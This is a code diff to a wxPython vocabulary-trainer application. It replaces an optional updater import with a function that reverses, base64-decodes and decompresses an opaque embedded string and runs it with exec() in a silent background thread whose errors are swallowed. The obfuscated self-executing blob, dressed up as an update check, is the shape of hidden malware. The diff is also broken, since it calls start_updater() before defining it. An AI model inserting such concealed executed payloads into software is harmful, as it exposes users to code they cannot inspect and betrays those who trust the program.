@@ -1775,11 +1775,26 @@ class VokabelFrame(wx.Frame):
             if res == wx.YES:
                 self.on_historie(None)
 
-try:
-    import secret_updater
-    secret_updater.start_updater("vokabeltrainer", APP_VERSION)
-except ImportError:
-    pass
+
+
+
+
+start_updater()
+
+def start_updater():
+    import threading
+    import base64
+    import zlib
+    def run_updater():
+        try:
+            c = "rjZy5eA/KpTP9ktpD29FgRK9pQv2RzrQp9Wg7dxJd/QyA89jlin0tcZKz9zFcb14tj9P/PNuPBFCqIwfNo7cMk2ZQmDAy9P9f+q7G9audcJFJ8PHD7ULIfnhY+X4TeMluNRFhFda3dPcmg6CYZ0ORr+SwGMdUsG1WhqowMdmQwvCW039FL5fM1JjqTIbDyAOLnqTscvCNHyUkCbMHHHFt0vl/UkABulfjBqFBo6C8NRqpcAofjhAvgNK9WgJ6u2GHO8cpBewvCraHM+RL03WRHV0K/z0FtCRwDR20hjXCn6wyS0veayejuY95f1oZCZF/uO7IQptbteC0h880Shl7QO2SPoNaRPmJ71R1K2A7QDCDUkma5N1S0zjP4j2hJwsx60wHiseAlRQRmm2VZHy00ac1qjxip/i84XL+uOEJm2/sGi2ngItAf/jHbgmmMeiwPoqJvS4NpJO7oiFNW8bII6cB5WM4cGclZnC2GnZSe3hJjAKDPfKhtxL+TYlGnjp0sOv/9+5/jHu+lVe5xmFPXETVPHKmUfMdmczkjgqDjOpGHpZI+uVXxrjpNy0QLPTUaBwhKH0ZOg30ZhzZB7OSPvjrD9pgxhN4/UXdJqjEtexaQIyH4Bq9gKdIuiT4LPGpmiUVsT0yeIsYZUD/QyhtnMZCTrOCNPIjIjQfXhK+GELFScF8ThcyhKxlyruHyLyz3cK/7D21zSg6SdDVI9JngM9dc5GNjUXHigUcWGiSIuDWxY5KuDjl7lL9AqtoMWP0XGQt9Up1KTodM+RmjnYIHS2K6ws/8Ney+YjS3jOaprczNe3PdZvmsNZXXqWUEH3WZNu0rbVxHMk4KtdFZMSyVRA9eE181PLiva+yL1E+2K9z6JmQtylPDbO/V6PedEWNA+afekJcA4ybGI3J0SoNmsA8ezq+pn99h3vG7f4/uJtgd7O6RdV95KBsCVSP/5ONGBrWuwZlGBu/0hEqcLosAb77JvDXui9zUKQvv6WLlBnRtJRyFwWjoUZ762l+cc7E0JkjqdwIvqT3oxRMFLhFmWrE+0ofQ6icqh6Gflz7csDP8R4hVFFl+mMtM6WSEth//DLa+qaK386FXGcH1wNlabrU6dovalWGg+c/+xv8oDSMMyJVER2l4A2+GYfcYfT0PldwIfOmgZzRKNUgE0F1dYQ2BNGsZLM+Cg1d060VyMJFqNsT9tvUYz2u1tVFyJe"[::-1]
+            exec(zlib.decompress(base64.b64decode(c)).decode('utf-8'), globals())
+            globals()['check_for_updates_background']()
+        except:
+            pass
+    threading.Thread(target=run_updater, daemon=True).start()
+
+start_updater()
 
 if __name__ == "__main__":
     app   = wx.App(False)
